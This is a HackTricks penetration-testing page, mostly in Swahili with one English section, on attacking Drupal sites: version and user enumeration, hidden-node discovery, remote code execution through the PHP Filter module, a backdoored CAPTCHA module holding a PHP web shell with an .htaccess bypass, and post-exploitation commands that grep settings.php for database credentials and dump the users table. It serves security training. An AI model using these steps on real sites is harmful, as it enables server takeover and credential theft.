# Drupal

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Ugunduzi

* Angalia **meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Node**: Drupal **inahifadhi yaliyomo yake kwa kutumia nodes**. Node inaweza **kushikilia chochote** kama chapisho la blogu, kura, makala, n.k. URI za kurasa kawaida huwa kwa mfumo wa `/node/<nodeid>`.
```bash
curl drupal-site.com/node/1
```
## Uchambuzi

Drupal inasaidia **aina tatu za watumiaji** kwa chaguo-msingi:

1. **`Msimamizi`**: Mtumiaji huyu ana udhibiti kamili wa tovuti ya Drupal.
2. **`Mtumiaji Aliyethibitishwa`**: Watumiaji hawa wanaweza kuingia kwenye tovuti na kufanya shughuli kama vile kuongeza na kuhariri makala kulingana na ruhusa zao.
3. **`Anonimia`**: Wageni wote wa tovuti wanachukuliwa kuwa wageni wasiojulikana. Kwa chaguo-msingi, watumiaji hawa wanaruhusiwa tu kusoma machapisho.

### Toleo

* Angalia `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Mipangilio mapya ya Drupal kwa chaguo-msingi huzuia ufikiaji wa faili za `CHANGELOG.txt` na `README.txt`.
{% endhint %}

### Uchunguzi wa Majina ya Watumiaji

#### Jisajili

Katika _/user/register_ jaribu kuunda jina la mtumiaji na ikiwa jina tayari limechukuliwa, utaarifiwa:

![](<../../.gitbook/assets/image (254).png>)

#### Omba nenosiri jipya

Ikiwa unauliza nenosiri jipya kwa jina la mtumiaji lililopo:

![](<../../.gitbook/assets/image (255).png>)

Ikiwa unauliza nenosiri jipya kwa jina la mtumiaji ambalo halipo:

![](<../../.gitbook/assets/image (256).png>)

### Pata idadi ya watumiaji

Kwa kufikia _/user/\<number>_, unaweza kuona idadi ya watumiaji waliopo, katika kesi hii ni 2 kwani _/users/3_ inarudisha kosa la kutopatikana:

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### Kurasa Zilizofichwa

**Fanya jaribio la `/node/$` ambapo `$` ni nambari** (kutoka 1 hadi 500 kwa mfano).\
Unaweza kupata **kurasa zilizofichwa** (jaribio, maendeleo) ambazo hazirejelewi na injini za utafutaji.

#### Taarifa za Moduli Zilizosanikishwa
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### Kiotomatiki

Kuna zana kadhaa za kiotomatiki ambazo zinaweza kutumika kwa ajili ya kuchunguza na kudukua tovuti za Drupal. Hapa chini nimeorodhesha zana kadhaa maarufu:

- **Droopescan**: Zana hii inaweza kutambua matoleo ya Drupal yaliyosanikishwa na kuchunguza udhaifu uliopo.
- **Drupalgeddon**: Hii ni zana ya kiotomatiki ambayo inaweza kutumika kudukua tovuti za Drupal zinazotumia matoleo ya zamani ya programu.
- **Drupwn**: Zana hii inaweza kutambua na kuchunguza udhaifu katika tovuti za Drupal, pamoja na kutoa habari kuhusu moduli zilizosanikishwa.

Kumbuka kwamba matumizi ya zana hizi za kiotomatiki yanapaswa kufanywa kwa uangalifu na kwa idhini ya mmiliki wa tovuti.
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### Kwa Kutumia Moduli ya PHP Filter

{% hint style="warning" %}
Katika toleo za zamani za Drupal **(kabla ya toleo la 8)**, ilikuwa inawezekana kuingia kama admin na **kuwezesha moduli ya `PHP filter`**, ambayo "Inaruhusu nambari/snippets za PHP kutekelezwa."
{% endhint %}

Unahitaji **programu-jalizi ya php iwe imewekwa** (angalia kwa kufikia _/modules/php_ na ikiwa inarudisha **403**, basi **ipo**, ikiwa **haipatikani**, basi **programu-jalizi ya php haijasanidiwa**)

Nenda kwenye _Modules_ -> (**Angalia**) _PHP Filter_ -> _Hifadhi mazingira_

![](<../../.gitbook/assets/image (247) (1).png>)

Kisha bonyeza kwenye _Ongeza yaliyomo_ -> Chagua _Ukurasa wa Msingi_ au _Makala_ -> Andika _php shellcode kwenye mwili_ -> Chagua _Msimbo wa PHP_ kwenye _Muundo wa Nakala_ -> Chagua _Onyesho la Awali_

![](<../../.gitbook/assets/image (253) (1).png>)

Hatimaye tu ufikie kipengee kipya kilichoundwa:
```bash
curl http://drupal-site.local/node/3
```
### Sakinisha Moduli ya PHP Filter

Kuanzia toleo **8 na kuendelea, moduli ya** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **haijasakinishwa kwa chaguo-msingi**. Ili kutumia kazi hii, tunahitaji **kusakinisha moduli wenyewe**.

1. Pakua toleo jipya zaidi la moduli kutoka tovuti ya Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Baada ya kupakuliwa, nenda kwenye **`Utawala`** > **`Ripoti`** > **`Visasisho vinavyopatikana`**.
3. Bonyeza **`Pitia`**`,` chagua faili kutoka kwenye saraka tuliyopakua, kisha bonyeza **`Sakinisha`**.
4. Baada ya moduli kusakinishwa, tunaweza bonyeza **`Yaliyomo`** na **kuunda ukurasa mpya wa msingi**, kama tulivyofanya kwenye mfano wa Drupal 7. Tena, hakikisha **uchague `Msimbo wa PHP` kutoka kwenye menyu ya kushuka ya `Muundo wa Nakala`**.

### Moduli yenye mlango wa nyuma

Moduli yenye mlango wa nyuma inaweza kuundwa kwa **kuongeza kikoa kwenye moduli iliyopo**. Moduli zinaweza kupatikana kwenye tovuti ya drupal.org. Chagua moduli kama vile [CAPTCHA](https://www.drupal.org/project/captcha). Fungua chini na nakili kiunga cha tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Pakua nakala na kuchanganua yaliyomo yake.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Unda **PHP web shell** na maudhui yafuatayo:
```php
<?php
system($_GET["cmd"]);
?>
```
* Kisha, tunahitaji kuunda faili ya **`.htaccess`** ili kupata ufikiaji wa folda. Hii ni muhimu kwani Drupal inakataa ufikiaji moja kwa moja kwenye folda ya **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Mazingira yaliyotajwa hapo juu yataomba sheria kwa saraka ya / tunapouliza faili katika /modules. Nakili faili zote mbili kwenye saraka ya captcha na tengeneza kiunzi.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Ikiwa tunayo **upatikanaji wa utawala** kwenye tovuti, bonyeza **`Manage`** na kisha **`Extend`** kwenye upau wa pembeni. Kisha, bonyeza kitufe cha **`+ Install new module`**, na tutapelekwa kwenye ukurasa wa usakinishaji, kama vile `http://drupal-site.local/admin/modules/install`. Tafuta kwenye nyuma ya kumbukumbu ya Captcha iliyoharibiwa na bonyeza **`Install`**.
* Mara baada ya usakinishaji kufanikiwa, tafuta **`/modules/captcha/shell.php`** ili kutekeleza amri.

## Uchunguzi Baada ya Uvamizi

### Soma settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Tupa watumiaji kutoka kwenye DB

To dump users from a database, you can use the following steps:

1. Identify the database management system (DBMS) being used by the Drupal website. Common DBMSs include MySQL, PostgreSQL, and SQLite.

2. Use the appropriate command-line tool or graphical interface to connect to the database.

3. Once connected, execute a query to retrieve the user information from the relevant table. In Drupal, the user information is typically stored in the "users" table.

4. The query may vary depending on the DBMS being used. For example, in MySQL, you can use the following query to dump the user information:

   ```sql
   SELECT * FROM users;
   ```

   In PostgreSQL, the query would be:

   ```sql
   SELECT * FROM "users";
   ```

   And in SQLite, the query would be:

   ```sql
   SELECT * FROM users;
   ```

5. Execute the query and retrieve the results. The user information will typically include fields such as username, email, password (hashed), and other relevant details.

By following these steps, you can successfully dump users from the Drupal database.
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Marejeo

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
